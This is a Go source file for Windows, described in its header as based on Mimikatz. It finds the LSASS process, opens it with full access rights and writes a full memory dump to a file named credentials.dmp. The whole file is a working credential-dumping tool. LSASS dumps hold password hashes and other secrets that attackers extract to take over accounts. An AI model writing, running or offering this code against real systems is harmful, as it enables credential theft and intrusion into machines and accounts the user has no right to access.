// +build windows
// Heavily based upon Mimikatz

package main

import (
    "bytes"
    "flag"
    "fmt"
    "os"
    "strings"
    "syscall"
    "unsafe"
)
/*
 * Full Process Dump
 * MiniDumpIgnoreInaccessibleMemory = 0x00020000
 * MiniDumpWithDataSegs             = 0x00000001
 * MiniDumpWithFullMemory           = 0x00000002
 * MiniDumpWithFullMemoryInfo       = 0x00000800
 * MiniDumpWithHandleData           = 0x00000004
 * MiniDumpWithProcessThreadData    = 0x00000100
 * MiniDumpWithThreadInfo           = 0x00001000
 * MiniDumpWithTokenInformation     = 0x00040000
 * ---------------------------------------------
 * MiniDump_Type                    = 0x00061907
 */

const (
    PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
    MINIDUMP_TYPE = 0x00061907
)

var (
    kernel32              = syscall.NewLazyDLL("kernel32.dll")
    openProcess           = kernel32.NewProc("OpenProcess")
    createFileW           = kernel32.NewProc("CreateFileW")
    dbghelp               = syscall.NewLazyDLL("Dbghelp.dll")
    miniDumpWriteDump     = dbghelp.NewProc("MiniDumpWriteDump")
    defaultCredFilePath   = "C:\\Users\\Public\\credentials.dmp"
)

type WindowsProcess struct {
    ProcessID       int
    ParentProcessID int
    ExeFile         string
}

func core(credFile string) error {
    lsass, err := getProcessByName("lsass")
    if err != nil {
        fmt.Fprintln(os.Stdout, "[-] Couldn't LSASS Process")
        return err
    }
    fmt.Fprintln(os.Stdout, "[+] Found LSASS Process")

    processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(lsass.ProcessID))
    if err != nil {
        fmt.Fprintln(os.Stdout, "[-] Couldn't get handle to LSASS Process")
        return err
    }
    fmt.Fprintln(os.Stdout, "[+] Got handle to LSASS Process")

    f, err := os.Create(credFile)
    if err != nil {
        fmt.Fprintln(os.Stdout, "[-] Couldn't create dump file")
        return err
    }
    defer f.Close()
    fmt.Fprintln(os.Stdout, "[+] Dump file created")


    ret, _, err := miniDumpWriteDump.Call(uintptr(processHandle), uintptr(lsass.ProcessID), f.Fd(), MINIDUMP_TYPE, 0, 0, 0)
    if ret != 0 {
        fmt.Fprintln(os.Stdout, "[+] LSASS process dump successful")
        return nil
    } else {
        fmt.Fprintln(os.Stderr, "[-] LSASS process dump not successful")
        return err
    }
}

func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
    end := getProcessNameLength(e)
    return WindowsProcess{
        ProcessID:       int(e.ProcessID),
        ParentProcessID: int(e.ParentProcessID),
        ExeFile:         syscall.UTF16ToString(e.ExeFile[:end]),
    }
}

func getProcessNameLength(e *syscall.ProcessEntry32) int {
    size := 0
    for _, char := range e.ExeFile {
        if char == 0 {
            break
        }
        size++
    }
    return size
}

func getProcessByName(name string) (*WindowsProcess, error) {
    snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
    if err != nil {
        return nil, err
    }
    defer syscall.CloseHandle(snapshot)

    var procEntry syscall.ProcessEntry32
    procEntry.Size = uint32(unsafe.Sizeof(procEntry))
    if err = syscall.Process32First(snapshot, &procEntry); err != nil {
        return nil, err
    }

    for {
        currProc := newWindowsProcess(&procEntry)
        if bytes.Contains([]byte(strings.ToUpper(currProc.ExeFile)), []byte(strings.ToUpper(name))) {
            return &currProc, nil
        } else {
            if err = syscall.Process32Next(snapshot, &procEntry); err != nil {
                if err == syscall.ERROR_NO_MORE_FILES {
                    return nil, err
                }
            }
        }
    }
}

func main() {
    credFile := flag.String("path", defaultCredFilePath, "Enter a credential file path (full path)")
    flag.Parse()
    if err := core(*credFile); err != nil {
        fmt.Fprintf(os.Stderr, "error: %v", err)
        os.Exit(1)
    }
}
